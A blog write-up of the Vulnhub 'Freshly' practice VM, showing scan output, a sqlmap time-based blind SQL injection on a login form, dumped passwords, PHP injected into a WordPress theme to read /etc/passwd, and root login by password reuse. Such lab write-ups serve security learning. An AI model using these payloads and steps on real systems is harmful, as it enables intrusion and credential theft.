
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="I continued to play with the vulnhub virtual machine and started the TopHatSec - Freshly. &#34;The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file. If you can find the secret, send me an email for verification. :)&#34;" />
<meta name="keywords" content="challenge, security, vulnhub, boot2root, linux">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="Vulnhub - Freshly"/>
  <meta property="og:description" content="I continued to play with the vulnhub virtual machine and started the TopHatSec - Freshly. &#34;The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file. If you can find the secret, send me an email for verification. :)&#34;"/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2015/04/vulnhub-freshly.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2015-04-20 00:00:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="Security"/>
  <meta property="article:tag" content="challenge"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="vulnhub"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="linux"/>
  <meta property="og:image" content="https://maggick.fr/meida/image.png">

  <title>maggick's logs &ndash; Vulnhub - Freshly</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="https://maggick.fr/meida/image.png" alt="" title="">
      </a>

      <h1>
        <a href="../../"></a>
      </h1>



      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="vulnhub-freshly">Vulnhub - Freshly</h1>
    <p>
      Posted on 20 Apr 2015 in <a href="../../category/security.html">Security</a>

        &#8226; 5 min read
    </p>
  </header>


  <div>
    <p><img class="align-left"
src="/media/2015.04/index_html_tumblr_mdeo27ZZjB1r6pf3eo1_500.gif"
alt="not the droids" width="262"></p>
<p>I continued to play with the vulnhub virtual machine and started the
<a href="https://www.vulnhub.com/entry/tophatsec-freshly,118/">TopHatSec - Freshly</a>.</p>
<p>"The goal of this challenge is to break into the machine via the web and find the
secret hidden in a sensitive file. If you can find the secret, send me an email
for verification. :)"</p>


<h1>Discovery</h1>
<p>As always we need to know which ports are open.</p>
<h2>nmap</h2>
<div class="highlight"><pre><span></span><code># Nmap 6.47 scan initiated Thu Apr 16 19:13:39 2015 as: nmap -A -A -oA nmap 10.0.2.5
Nmap scan report for 10.0.2.5
Host is up (0.00087s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn&#39;t have a title (text/html).
443/tcp  open  ssl/http Apache httpd
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn&#39;t have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-02-17T03:30:05+00:00
|_Not valid after:  2025-02-14T03:30:05+00:00
|_ssl-date: 2047-09-11T02:34:36+00:00; +32y147d13h20m44s from local time.
8080/tcp open  http     Apache httpd
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn&#39;t have a title (text/html).

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
# Nmap done at Thu Apr 16 19:13:52 2015 -- 1 IP address (1 host up) scanned in 12.77 seconds
</code></pre></div>

<p>There is three ports with a web server running:</p>
<ul>
<li>The 80 just display an gif.</li>
<li>The 443 seems to be like the 8080 with SSL.</li>
<li>The 8080 is a wordpress website which seems to sell candy (who doesn't love
      candy?).</li>
</ul>
<p><img alt="not the droids" src="/media/2015.04/index_html_tumblr_mdeo27ZZjB1r6pf3eo1_500.gif"></p>
<p><em>I try to see if there was any differences between this gif and the original
one, but nothing.</em></p>
<h2>Nikto</h2>
<p>I like to use <a href="https://cirt.net/Nikto2">Nikto</a> when discovering website, I will put only the
interesting stuff, but I ran <a href="https://cirt.net/Nikto2">Nikto</a> on the 3 ports.</p>
<p>Port 80:</p>
<div class="highlight"><pre><span></span><code>[maggick@rootine Freshly]$ nikto -host 10.0.2.5
Server: Apache/2.4.7 (Ubuntu)
+ /login.php: Admin login page/section found.
+ /phpmyadmin/: phpMyAdmin directory found
</code></pre></div>

<p><img alt="login.php" src="/media/2015.04/login.php.png"></p>
<p>Port 8080:</p>
<div class="highlight"><pre><span></span><code>[maggick@rootine Freshly]$ nikto -host 10.0.2.5 -port 8080
+ OSVDB-3268: /img/: Directory indexing found.
+ /wordpress/: A Wordpress installation was found
</code></pre></div>

<p>We got two login interfaces and a directory listing with images. Let's take a
look at the wordpress installation.</p>
<p><img alt="wordpress, index" src="/media/2015.04/wordpress_index.png"></p>
<p><em>The directory listening was not of any use. As well the phpmyadmin interface
was not usefull.</em></p>
<h2>WPScan</h2>
<p>We run <a href="https://github.com/wpscanteam/wpscan"><code>wpscan</code></a> on the 8080 website:</p>
<div class="highlight"><pre><span></span><code>[maggick@rootine wpscan]$ ruby wpscan.rb --url http://10.0.2.5:8080/wordpress/
[+] URL: http://10.0.2.5:8080/wordpress/
[+] Started: Thu Apr 16 20:01:39 2015

[!] The WordPress &#39;http://10.0.2.5:8080/wordpress/readme.html&#39; file exists exposing a version number
[!] Full Path Disclosure (FPD) in: &#39;http://10.0.2.5:8080/wordpress/wp-includes/rss-functions.php&#39;
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] XML-RPC Interface available under: http://10.0.2.5:8080/wordpress/xmlrpc.php

[+] WordPress version 4.1.1 identified from meta generator

[+] Enumerating plugins from passive detection ...
 | 4 plugins found:

[+] Name: cart66-lite - v1.5.3
 |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/cart66-lite/
 |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt

[!] Title: Cart66 Lite &lt;= 1.5.3 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/7737
    Reference: https://research.g0blin.co.uk/g0blin-00022/
    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442
[i] Fixed in: 1.5.4

[+] Name: contact-form-7 - v4.1
 |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/contact-form-7/
 |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/contact-form-7/readme.txt

[+] Name: proplayer - v4.7.9.1
 |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/proplayer/
 |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/proplayer/readme.txt

[!] Title: ProPlayer 4.7.9.1 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/6912
    Reference: http://osvdb.org/93564
    Reference: http://www.exploit-db.com/exploits/25605/

[+] Name: all-in-one-seo-pack - v2.2.5.1
 |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/
 |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/readme.txt

[!] Title: All in One SEO Pack &lt;= 2.2.5.1 - Authentication Bypass
    Reference: https://wpvulndb.com/vulnerabilities/7881
    Reference: http://jvn.jp/en/jp/JVN75615300/index.html
    Reference: http://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/
    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0902
[i] Fixed in: 2.2.6
</code></pre></div>

<p>We got some nice results, three plug-in have security issues. Digging furtherer,
we notice that:</p>
<ul>
<li>All in One SEO Pack  - Authentication Bypas: There was nothing in the metadata.</li>
<li>Cart66 Lite 1.5.3 - SQL Injection: Need to be authenticated</li>
<li>proplayer 4.7.9.1 - SQL Injection: Concerns a non available URL (you can run sqlmap on it to confirm this)</li>
</ul>
<p>Therefore none of this will help us in this challenge.</p>
<h1>Exploit</h1>
<p>Nikto shows us some interesting URL. The login interface at <code>login.php</code> may be
injectable.</p>
<h2>sqlmap</h2>
<p>We need to use burp in order to save the POST request to a file, an then we
launch <a href="http://sqlmap.org">sqlmap</a> on the <code>login.php</code> URL:</p>
<div class="highlight"><pre><span></span><code>[maggick@rootine sqlmap]$ python2 sqlmap.py -r login_req -p user
         _
 ___ ___| |_____ ___ ___  {1.0-dev-dbfa8f1}
|_ -| . | |     | .&#39;| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[*] starting at 20:43:22

[20:43:22] [INFO] parsing HTTP request from &#39;/home/maggick/work/chall/vulnhub/Freshly/login_req&#39;
[20:43:22] [INFO] resuming back-end DBMS &#39;mysql&#39;
[20:43:22] [INFO] testing connection to the target URL
[20:43:22] [INFO] heuristics detected web page charset &#39;ascii&#39;
sqlmap identified the following injection points with a total of 0 HTTP(s)
requests:
---
Parameter: user (POST)
    Type: AND/OR time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)
    Payload: user=asdf&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))RaKL) AND &#39;KuPd&#39;=&#39;KuPd&amp;password=asdf&amp;s=Submit
---
[20:43:22] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0.12
[20:43:22] [INFO] fetched data logged to text files under &#39;/home/maggick/.sqlmap/output/10.0.2.5&#39;

[*] shutting down at 20:43:22
</code></pre></div>

<p>Okay the <code>user</code> parameter is vulnerable to a time-based blind injection. Let's
see what are the databases:</p>
<div class="highlight"><pre><span></span><code>[maggick@rootine sqlmap]$ python2 sqlmap.py -r ~/work/chall/vulnhub/Freshly/longin_req -p user --dbs
back-end DBMS: MySQL 5.0.12
[...]
available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080
</code></pre></div>

<p>Let's dump the interesting databases, <code>users</code> and <code>login</code>:</p>
<p>users:</p>
<div class="highlight"><pre><span></span><code>Database: login
Table: users
[2 entries]
+----------+-----------+
| password | user_name |
+----------+-----------+
| password | candyshop |
| PopRocks | Sir       |
+----------+-----------+
</code></pre></div>

<p>login:</p>
<div class="highlight"><pre><span></span><code>Database: wordpress8080
Table: users
[1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    | SuperSecretPassword |
+----------+---------------------+
</code></pre></div>

<p>So we got some passwords. Then let's use the wordpress password.</p>
<h2>Admin, PHP and Flag</h2>
<p>We got the admin password for <code>http://10.0.2.5:8080/wordpress/wp-login</code>.</p>
<p><img alt="wordpress, admin interface" src="/media/2015.04/wordpress_admin.png"></p>
<p>As we want to read a file on the system, let's put some PHP code in the theme:
We go to Appearance -&gt; Editor -&gt; Footer (footer.php) and add some PHP code in
order to execute it, let's get the <code>/etc/passwd</code> file :</p>
<div class="highlight"><pre><span></span><code><span class="x"> </span><span class="cp">&lt;?php</span>
<span class="nv">$myfile</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Unable to open file!&quot;</span><span class="p">);</span>
<span class="k">echo</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nb">filesize</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">));</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>

<p>When we reload the index page we got the <code>/etc/password</code> file in the footer:</p>
<div class="highlight"><pre><span></span><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
candycane:x:1001:1001::/home/candycane:
# YOU STOLE MY SECRET FILE!
# SECRET = &quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;
</code></pre></div>

<p>Wut? We already got the flag!
No need to root the systemâ€¦ sadly.</p>
<p>As there is not ssh port open, I tried to log on the VM with
<code>root:SuperSecretPassword</code> and it simply worked.</p>
<h1>Summary</h1>
<p>This was a simple challenge, based on web pentesting.
It was a bit short but nonetheless interesting.</p>
<p>Road to flag:</p>
<ul>
<li>SQL injection on the <code>/login.php</code> interface</li>
<li>Get the wordpress admin password</li>
<li>As wordpress admin inject PHP code in the web site (via the theme)</li>
<li>Display <code>/etc/passwd</code></li>
</ul>
<p>Flag : <strong>"NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"</strong></p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/challenge.html">challenge</a>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/vulnhub.html">vulnhub</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/linux.html">linux</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2015/04/ctf-ndh-qualifications.html" title="CTF NDH Qualifications">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2015/05/blog-changes-2.html" title="Blog changes #2">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/meida/image.png",
  "description": ""
}
</script>

</body>
</html>